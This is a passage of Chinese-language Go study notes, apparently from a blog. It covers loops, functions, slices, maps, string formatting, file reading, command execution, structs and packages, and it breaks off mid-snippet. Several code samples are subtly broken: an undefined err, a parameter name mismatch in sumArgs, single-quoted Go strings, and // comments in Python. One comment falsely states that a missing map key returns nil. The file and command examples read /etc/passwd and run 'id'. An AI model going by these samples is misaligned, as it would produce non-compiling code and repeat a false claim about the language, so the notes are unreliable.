</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j := <span class="number">1</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"loop"</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>Go 只有值传递参数，可传递指针</p><p>返回一个局部变量的地址没有问题，该局部变量对应的数据在函数返回后依然有效，编译器采用逃逸分析技术。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回多个值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">eval</span><span class="params">(a, b <span class="keyword">int</span>, opt <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">int</span>, error)</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>, fmt.Errorf(<span class="string">"error: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数参数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">apply</span><span class="params">(op <span class="keyword">func</span>(<span class="keyword">int</span>, <span class="keyword">int</span>)</span> <span class="title">int</span>, <span class="title">a</span>, <span class="title">b</span> <span class="title">int</span>) <span class="title">int</span></span> &#123;</span><br><span class="line">p := reflect.ValueOf(op).Pointer()</span><br><span class="line">opName := runtime.FuncForPC(p).Name()</span><br><span class="line">fmt.Printf(<span class="string">"Calling function %s with args %d, %d"</span>, opName, a, b)</span><br><span class="line"><span class="keyword">return</span> op(a, b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匿名函数</span></span><br><span class="line">apply(<span class="function"><span class="keyword">func</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可变参数列表，无默认参数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sumArgs</span><span class="params">(members ...<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    s := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> numbers &#123;</span><br><span class="line">        s += numbers[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">arr := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">sumArgs(arr...)</span><br></pre></td></tr></table></figure><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>指针不能运算</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="keyword">int</span> = <span class="number">2</span></span><br><span class="line"><span class="keyword">var</span> pa *<span class="keyword">int</span> = &amp;a</span><br><span class="line">*pa = <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>Go 一般不用数组，用切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr [<span class="number">5</span>]<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">b := [<span class="number">5</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">b := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> grid [<span class="number">2</span>][<span class="number">3</span>]<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> grid [][]<span class="keyword">int</span> = [][]<span class="keyword">int</span>&#123;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">grid := [<span class="number">2</span>][<span class="number">3</span>]<span class="keyword">int</span>&#123;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> grid &#123;</span><br><span class="line">    fmt.Println(k, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [10]int，[5]int 是不同类型，数组传递是值传递，会拷贝</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printArray</span><span class="params">(arr [10]<span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    fmt.Println(arr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><p>切片本身没有数据，是对底层数组的一个 view，是功能强悍的”动态数组“。</p><p>切片通过对数组进行封装，为数据序列提供了更通用、强大的接口。</p><p>除了矩阵变换这类需要明确维度的情况外， Go 中大部分数组编程都是通过切片来实现的。</p><p>切片保存了对底层数组的引用，若将某个切片赋值给另一个切片，它们将引用同一个数组。</p><p><code>len(s)</code> 用来获取长度，当前有多少个值，用了多少</p><p><code>cap(s)</code> 切片总容量</p><p><code>append(s, tg)</code> 添加元素</p><p><code>copy(dst, src)</code> 拷贝切片</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">arr := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line"></span><br><span class="line">slice := []<span class="keyword">int</span></span><br><span class="line">slice := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">slice := <span class="built_in">make</span>([]<span class="keyword">type</span>, <span class="built_in">len</span>)  <span class="comment">// 创建空切片，可不指定 cap</span></span><br><span class="line">slice := <span class="built_in">make</span>([]<span class="keyword">type</span>, <span class="built_in">len</span>, <span class="built_in">cap</span>)</span><br><span class="line"></span><br><span class="line">fmt.Println(arr[:])</span><br><span class="line">fmt.Println(arr[:<span class="number">3</span>])</span><br><span class="line">fmt.Println(arr[<span class="number">2</span>:])</span><br><span class="line">fmt.Println(arr[<span class="number">3</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多次切片，可以超过上次切片范围，不可超过 cap(s)，即向后扩展</span></span><br><span class="line">s := arr[<span class="number">3</span>:<span class="number">5</span>]</span><br><span class="line">rs := s[<span class="number">4</span>:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩展，由于是值传递，必须用个变量来接收，底层将创建一个新的 array 来支撑切片</span></span><br><span class="line">b = <span class="built_in">append</span>(b, <span class="number">10</span>)</span><br><span class="line">b = <span class="built_in">append</span>(b, s...)  <span class="comment">// 不能 +，但可变参数能直接添加切片</span></span><br><span class="line">fmt.Println(b)</span><br></pre></td></tr></table></figure><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p>哈希表实现，除了 slice、map、function 的内建类型都可以做 key，不含这些字段的 Struct 也可</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span>)  <span class="comment">// 创建空map</span></span><br><span class="line">m[<span class="string">"one"</span>] = <span class="number">1</span></span><br><span class="line">m[<span class="string">"two"</span>] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">m := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span> &#123;</span><br><span class="line">    <span class="string">"one"</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">"two"</span>: <span class="number">2</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问，不存在放回 nil</span></span><br><span class="line">one := m[<span class="string">"one"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否存在，为啥能选择返回值？</span></span><br><span class="line">one, ok := m[<span class="string">"one"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历</span></span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> m &#123;</span><br><span class="line">    fmt.Println(k, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(m, <span class="string">"one"</span>)</span><br></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>Go 特意做了优化，设计了 rune，可以完美的支持多语言。</p><p><code>&#39;a&#39;</code> 为字符 rune、<code>&quot;abc&quot;</code> 为字符串，`` 可包含复杂的字符串。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s := <span class="string">"我爱Go语言!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, ch := <span class="keyword">range</span> []<span class="keyword">rune</span>(s) &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"(%d %c)"</span>, i, ch)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// (0 我)(1 爱)(2 G)(3 o)(4 语)(5 言)(6 !)</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">fmt.Printf(<span class="string">"%t\n"</span>, <span class="number">1</span>==<span class="number">2</span>)</span><br><span class="line">fmt.Printf(<span class="string">"二进制：%b\n"</span>, <span class="number">255</span>)</span><br><span class="line">fmt.Printf(<span class="string">"八进制：%o\n"</span>, <span class="number">255</span>)</span><br><span class="line">fmt.Printf(<span class="string">"十六进制：%X\n"</span>, <span class="number">255</span>)</span><br><span class="line">fmt.Printf(<span class="string">"十进制：%d\n"</span>, <span class="number">255</span>)</span><br><span class="line">fmt.Printf(<span class="string">"浮点数：%f\n"</span>, math.Pi)</span><br><span class="line">fmt.Printf(<span class="string">"字符串：%s\n"</span>, <span class="string">"hello world"</span>)</span><br><span class="line">fmt.Printf(<span class="string">"类型：%T\n"</span>, <span class="string">"hello world"</span>)</span><br><span class="line">fmt.Printf(<span class="string">"字段在内的实例的完整信息：%+v\n"</span>, <span class="string">"hello world"</span>)</span><br><span class="line">fmt.Printf(<span class="string">"字段和限定类型名称在内的实例的完整信息：%#v\n"</span>, <span class="string">"hello world"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Go 为常规 Go 值的格式化设计提供了多种打印方式。例如，这里打印了 `point` 结构体的一个实例。</span></span><br><span class="line">p := point&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">fmt.Printf(<span class="string">"%v\n"</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果值是一个结构体，`%+v` 的格式化输出内容将包括结构体的字段名。</span></span><br><span class="line">fmt.Printf(<span class="string">"%+v\n"</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment">// `%#v` 形式则输出这个值的 Go 语法表示。例如，值的运行源代码片段。</span></span><br><span class="line">fmt.Printf(<span class="string">"%#v\n"</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要打印值的类型，使用 `%T`。</span></span><br><span class="line">fmt.Printf(<span class="string">"%T\n"</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化布尔值是简单的。</span></span><br><span class="line">fmt.Printf(<span class="string">"%t\n"</span>, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 格式化整型数有多种方式，使用 `%d`进行标准的十进制格式化。</span></span><br><span class="line">fmt.Printf(<span class="string">"%d\n"</span>, <span class="number">123</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个输出二进制表示形式。</span></span><br><span class="line">fmt.Printf(<span class="string">"%b\n"</span>, <span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个输出给定整数的对应字符。</span></span><br><span class="line">fmt.Printf(<span class="string">"%c\n"</span>, <span class="number">33</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// `%x` 提供十六进制编码。</span></span><br><span class="line">fmt.Printf(<span class="string">"%x\n"</span>, <span class="number">456</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于浮点型同样有很多的格式化选项。使用 `%f` 进行最基本的十进制格式化。</span></span><br><span class="line">fmt.Printf(<span class="string">"%f\n"</span>, <span class="number">78.9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// `%e` 和 `%E` 将浮点型格式化为（稍微有一点不同的）科学记数法表示形式。</span></span><br><span class="line">fmt.Printf(<span class="string">"%e\n"</span>, <span class="number">123400000.0</span>)</span><br><span class="line">fmt.Printf(<span class="string">"%E\n"</span>, <span class="number">123400000.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 `%s` 进行基本的字符串输出。</span></span><br><span class="line">fmt.Printf(<span class="string">"%s\n"</span>, <span class="string">"\"string\""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 像 Go 源代码中那样带有双引号的输出，使用 `%q`。</span></span><br><span class="line">fmt.Printf(<span class="string">"%q\n"</span>, <span class="string">"\"string\""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 和上面的整型数一样，`%x` 输出使用 base-16 编码的字符串，每个字节使用 2 个字符表示。</span></span><br><span class="line">fmt.Printf(<span class="string">"%x\n"</span>, <span class="string">"hex this"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 要输出一个指针的值，使用 `%p`。</span></span><br><span class="line">fmt.Printf(<span class="string">"%p\n"</span>, &amp;p)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当输出数字的时候，你将经常想要控制输出结果的宽度和精度，可以使用在 `%` 后面使用数字来控制输出宽度。</span></span><br><span class="line"><span class="comment">// 默认结果使用右对齐并且通过空格来填充空白部分。</span></span><br><span class="line">fmt.Printf(<span class="string">"|%6d|%6d|\n"</span>, <span class="number">12</span>, <span class="number">345</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你也可以指定浮点型的输出宽度，同时也可以通过 宽度.精度 的语法来指定输出的精度。</span></span><br><span class="line">fmt.Printf(<span class="string">"|%6.2f|%6.2f|\n"</span>, <span class="number">1.2</span>, <span class="number">3.45</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 要左对齐，使用 `-` 标志。</span></span><br><span class="line">fmt.Printf(<span class="string">"|%-6.2f|%-6.2f|\n"</span>, <span class="number">1.2</span>, <span class="number">3.45</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你也许也想控制字符串输出时的宽度，特别是要确保他们在类表格输出时的对齐。这是基本的右对齐宽度表示。</span></span><br><span class="line">fmt.Printf(<span class="string">"|%6s|%6s|\n"</span>, <span class="string">"foo"</span>, <span class="string">"b"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 要左对齐，和数字一样，使用 `-` 标志。</span></span><br><span class="line">fmt.Printf(<span class="string">"|%-6s|%-6s|\n"</span>, <span class="string">"foo"</span>, <span class="string">"b"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 到目前为止，我们已经看过 `Printf`了，它通过 `os.Stdout`输出格式化的字符串。`Sprintf` 则格式化并返回一个字符串而不带任何输出。</span></span><br><span class="line">s := fmt.Sprintf(<span class="string">"a %s"</span>, <span class="string">"string"</span>)</span><br><span class="line">fmt.Println(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你可以使用 `Fprintf` 来格式化并输出到 `io.Writers`而不是 `os.Stdout`。</span></span><br><span class="line">fmt.Fprintf(os.Stderr, <span class="string">"an %s\n"</span>, <span class="string">"error"</span>)</span><br></pre></td></tr></table></figure><p>还有对应的 strings、strconv 包。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s := <span class="string">"This is an example of a string.中文"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 前后缀</span></span><br><span class="line"><span class="built_in">println</span>(strings.HasPrefix(s, <span class="string">"This"</span>))</span><br><span class="line"><span class="built_in">println</span>(strings.HasSuffix(s, <span class="string">"string"</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 包含子串</span></span><br><span class="line"><span class="built_in">println</span>(strings.Contains(s, <span class="string">"a "</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子串在父串中的索引</span></span><br><span class="line"><span class="built_in">println</span>(strings.Index(s, <span class="string">"is"</span>))</span><br><span class="line"><span class="built_in">println</span>(strings.LastIndex(s, <span class="string">"i"</span>))</span><br><span class="line"><span class="comment">// println(strings.IndexRune(s, []rune("string"))) // 非 ASCII 用这个</span></span><br><span class="line"></span><br><span class="line">strings.Replace()</span><br><span class="line">strings.ToLower(s) <span class="keyword">string</span></span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// os.Open</span></span><br><span class="line">f, err := os.Open(<span class="string">'/etc/passwd'</span>)</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">10</span>)</span><br><span class="line">f.Read(buf)</span><br><span class="line"></span><br><span class="line"><span class="comment">// os.OpenFile</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bufio 缓冲</span></span><br><span class="line">r := bufio.NewReader(f)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    str, err := r.ReadString(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(str)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ioutil 一次读完</span></span><br><span class="line">content, err := ioutil.ReadFile(<span class="string">'/etc/passwd'</span>)  <span class="comment">// content 为 []byte</span></span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cmd := exec.Command(<span class="string">"id"</span>)</span><br><span class="line">stdoutStderr, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatal(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="面向“对象”"><a href="#面向“对象”" class="headerlink" title="面向“对象”"></a>面向“对象”</h2><p>仅支持封装，不支持继承和多态</p><h3 id="结构体和方法"><a href="#结构体和方法" class="headerlink" title="结构体和方法"></a>结构体和方法</h3><p>用大小写来区分，大写开头 public、小写开头 private，private 只能在当前包内使用（使用工厂模式解决，即自行实现（大写开头）构造函数）</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Books <span class="keyword">struct</span> &#123;</span><br><span class="line">    title <span class="keyword">string</span></span><br><span class="line">    author <span class="keyword">string</span></span><br><span class="line">    book_id <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">books := Books&#123;</span><br><span class="line">    title:   <span class="string">"Go"</span>,</span><br><span class="line">    author:  <span class="string">"Tim"</span>,</span><br><span class="line">    book_id: <span class="string">"1"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">books = Books&#123;<span class="string">"Go"</span>, <span class="string">"Tim"</span>, <span class="string">"2"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传值，注意一致性，如果有指针接收，最好全用指针接收</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(book Books)</span> <span class="title">print</span><span class="params">()</span></span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传指针，nil 指针也可以调用方法，某些情景下需要加下判断</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(book *Books)</span> <span class="title">print</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> book == <span class="literal">nil</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承</span></span><br><span class="line"><span class="keyword">type</span> Edu <span class="keyword">struct</span> &#123;</span><br><span class="line">    Books  <span class="comment">// 写个匿名结构体就行</span></span><br><span class="line">    name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="包和封装"><a href="#包和封装" class="headerlink" title="包和封装"></a>包和封装</h3><p>同一个目录下只能有一个包，main 包下为主入口</p><p>为结构定义的方法必须放在同一个包内</p><p>可以是不同文件</p><p>import 中可以使用相对路径 <code>./</code>、<code>../</code> 引用包，如果没有用相对路径，go 会去 $GOPATH/src/ 目录找</p><h3 id="扩展已有类型"><a href="#扩展已有类型" class="headerlink" title="扩展已有类型"></a>扩展已有类型</h3><h4 id="定义别名"><a href="#定义别名" class="headerlink" title="定义别名"></a>定义别名</h4><h4 id="使用组合"><a href="#使用组合" class="headerlink" title="使用组合"></a>使用组合</h4><h3 id="使用内嵌来扩展已有类型"><a href="#使用内嵌来扩展已有类型" class="headerlink" title="使用内嵌来扩展已有类型"></a>使用内嵌来扩展已有类型</h3><h2 id="依赖管理"><a href="#依赖管理" class="headerlink" title="依赖管理"></a>依赖管理</h2><h3 id="依赖管理-1"><a href="#依赖管理-1" class="headerlink" title="依赖管理"></a>依赖管理</h3><h3 id="GOPATH-和-GOVENDOR"><a href="#GOPATH-和-GOVENDOR" class="headerlink" title="GOPATH 和 GOVENDOR"></a>GOPATH 和 GOVENDOR</h3><p>gopath 和 path 一样，可以接受多个路径，路径之间用冒号分隔</p><h3 id="go-mod-的使用"><a href="#go-mod-的使用" class="headerlink" title="go mod 的使用"></a>go mod 的使用</h3><h3 id="目录的整理"><a href="#目录的整理" class="headerlink" title="目录的整理"></a>目录的整理</h3><h2 id="面向接口"><a href="#面向接口" class="headerlink" title="面向接口"></a>面向接口</h2><h3 id="duck-typing"><a href="#duck-typing" class="headerlink" title="duck typing"></a>duck typing</h3><ul><li>“像鸭子走路，像鸭子叫，长的像鸭子，那么就是鸭子”</li><li>描述事物的外部行为而非内部结构</li><li>严格来说 go 属于结构化类型系统，类似 duck typing</li></ul><p>Python 中的鸭子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 运行时才知道传入的 retriever 有没有 get 方法</span><br><span class="line">// 需要注释来说明接口</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(retriever)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> retriever.get(<span class="string">"http://qq.com"</span>)</span><br></pre></td></tr></table></figure><p>C++ 中的鸭子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 同 